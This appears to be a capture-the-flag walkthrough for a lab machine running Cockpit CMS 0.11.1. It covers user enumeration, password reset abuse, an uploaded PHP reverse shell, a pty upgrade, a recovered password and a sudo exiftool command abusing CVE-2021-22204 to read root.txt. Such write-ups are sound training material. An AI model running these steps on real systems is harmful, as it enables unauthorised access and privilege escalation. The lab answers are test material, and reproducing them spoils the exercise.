## What is the name of the Content Management System (CMS) installed on the server?

```TEXT
Cockpit
```

<span>&nbsp;</span>

## What is the version of the Content Management System (CMS) installed on the server?

<img width="1537" height="314" alt="image" src="https://github.com/user-attachments/assets/56c7142d-bceb-4b14-b9fb-2fbef9b673fe" />

```TEXT
0.11.1
```

<span>&nbsp;</span>

## What is the path that allow user enumeration?

<img width="874" height="398" alt="image-1" src="https://github.com/user-attachments/assets/ff93d91b-eb90-4c66-8cce-fcb158d20b62" />

```TEXT
/auth/check
```

<span>&nbsp;</span>

## How many users can you identify when you reproduce the user enumeration attack?

<img width="670" height="341" alt="image-2" src="https://github.com/user-attachments/assets/f74d0566-4b5e-4076-9912-d244d4a352c6" />

<img width="1023" height="458" alt="image-3" src="https://github.com/user-attachments/assets/38d26f8d-f656-474b-889b-e389d21682ec" />

<span>&nbsp;</span>

## What is the path that allows you to change user account passwords?

```TEXT
/auth/resetpassword
```

<span>&nbsp;</span>

## Compromise the Content Management System (CMS). What is Skidy's email.

<img width="1013" height="413" alt="image-6" src="https://github.com/user-attachments/assets/979b3de3-fb10-4d74-970f-108d24a8c1fb" />

<img width="1252" height="462" alt="image-5" src="https://github.com/user-attachments/assets/9ccfd1df-ee15-48f7-b3ad-4c2cb56146b0" />

<span>&nbsp;</span>

##  What is the web flag?

<img width="672" height="325" alt="image-7" src="https://github.com/user-attachments/assets/13e29293-958f-4e08-9927-8010a74e7d69" />

<img width="971" height="312" alt="image-8" src="https://github.com/user-attachments/assets/8733c3f7-d7d6-4925-a96d-6f7db76b47f9" />

<img width="629" height="150" alt="image-9" src="https://github.com/user-attachments/assets/24dc15a8-9236-421e-b7c9-94827244d18a" />

<span>&nbsp;</span>

## Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?

<img width="898" height="123" alt="image-12" src="https://github.com/user-attachments/assets/c6ccb9f6-0bce-4fed-9d25-a5ece3859d5c" />

<img width="888" height="90" alt="image-10" src="https://github.com/user-attachments/assets/1d3d5617-7da5-447c-938d-d1082edde637" />

<img width="936" height="86" alt="image-11" src="https://github.com/user-attachments/assets/5fd36d6b-b801-45ab-81b5-7145cecef949" />

Go to: `http://$machine-ip/php-reverse-shell.php` to trigger reverse shell.

```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")' 
```

<img width="956" height="229" alt="image-13" src="https://github.com/user-attachments/assets/3828b50a-a578-47d2-8991-a8e1e56debf4" />

<img width="621" height="365" alt="image-14" src="https://github.com/user-attachments/assets/fa5fa1cb-e155-40ca-b201-f50401fad8d5" />

<span>&nbsp;</span>

## What is the user.txt flag?

<img width="595" height="131" alt="image-15" src="https://github.com/user-attachments/assets/67a20853-6066-4b02-8299-f634f95187dd" />

```BASH
p4ssw0rdhack3d!123
```

```
su stux
```

<img width="510" height="134" alt="image-16" src="https://github.com/user-attachments/assets/7852a664-99c1-46ed-820d-ee0cfac7b8a8" />

<span>&nbsp;</span>

## What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000-0000

<img width="839" height="141" alt="image-17" src="https://github.com/user-attachments/assets/e3b87377-2cc6-40a5-a75f-bba8a027fc97" />

```TEXT
CVE-2021-22204
```

<span>&nbsp;</span>

## What is the utility used to create the PoC file?

```TEXT
djvumake
```

<span>&nbsp;</span>

## Escalate your privileges. What is the flag in root.txt?

Use gtfobins.

```BASH
sudo exiftool -filename=/home/stux/root.txt /root/root.txt
```

<img width="701" height="182" alt="image-18" src="https://github.com/user-attachments/assets/b7ad4baa-cda5-477a-99a6-0804dcba2a75" />
